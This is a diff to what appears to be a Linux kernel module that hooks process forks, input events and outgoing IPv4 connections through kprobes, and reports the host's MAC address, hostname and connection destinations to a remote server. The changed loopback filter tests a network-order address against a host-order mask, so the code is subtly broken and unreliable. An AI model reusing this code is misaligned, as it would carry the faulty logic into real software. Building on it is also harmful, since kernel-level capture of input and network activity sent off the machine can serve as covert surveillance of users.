@@ -34,7 +34,7 @@ static struct kprobe kps[PROBES_SIZE] = {
 /* Fork hook */
 static int handler_pre_do_fork(struct kprobe *kp, struct pt_regs *regs) {
   // Check for validity and also not sending kernel process
-  if (!current || !current->mm || (current->flags & PF_KTHREAD))
+  if (!current || !current->mm)
     return 0;
 
   // Check for processes which activated by user
@@ -118,20 +118,39 @@ static int handler_pre_input_event(struct kprobe *kp, struct pt_regs *regs) {
 
 /* Output ip communication */
 static int handler_pre_inet_sendmsg(struct kprobe *kp, struct pt_regs *regs) {
-  struct socket *skt;
-  struct dst_entry *dst;
-  struct in_addr dest_ip4;
-  if (!regs || !regs->di)
+  struct socket *sock;
+  struct sock *sk;
+
+  uint32_t addr;
+
+  // Prevent logging messages from your own kernel module
+  if (current->comm &&
+      (strncmp(current->comm, MODULE_NAME, MODULE_NAME_LENGTH) == 0)) {
     return 0;
+  }
 
   // First parameter is struct socket pointer
-  skt = (struct socket *)regs->di;
-  if (!skt->sk || !skt->sk->sk_dst_cache)
+  sock = (struct socket *)regs->di;
+  if (!sock || !sock->sk)
     return 0;
 
-  dst = skt->sk->sk_dst_cache;
-  dest_ip4 = ((struct sockaddr_in *)&dst->peer)->sin_addr;
-  return protocol_send_message(MSG_SEND_IP, "%s", inet_ntoa(dest_ip4));
+  sk = sock->sk;
+
+  // Check if it's an IPv4 socket
+  if (sk->sk_family != AF_INET)
+    return 0;
+
+  // Skip zero or invalid addresses
+  if (!sk->sk_daddr)
+    return 0;
+
+  // Not hooking on 127.x.x.x
+  addr = sk->sk_daddr;
+  if ((addr & 0xFF000000) == 0x7F000000)
+    return 0;
+
+  // Convert and send IP address
+  return protocol_send_message(MSG_SEND_IP, "%pI4", &addr);
 }
 
 /* Sends mac and hostname to server */
@@ -140,8 +159,8 @@ static int handle_credentials(void) {
   get_mac_address(mac_buf);
 
   // Send mac address and hostname
-  return send_message(MSG_AUTH, "%s" PROTOCOL_SEPARATOR "%s", mac_buf,
-                      utsname()->nodename);
+  return protocol_send_message(MSG_AUTH, "%s" PROTOCOL_SEPARATOR "%s", mac_buf,
+                               utsname()->nodename);
 }
 
 /* Register all hooks */
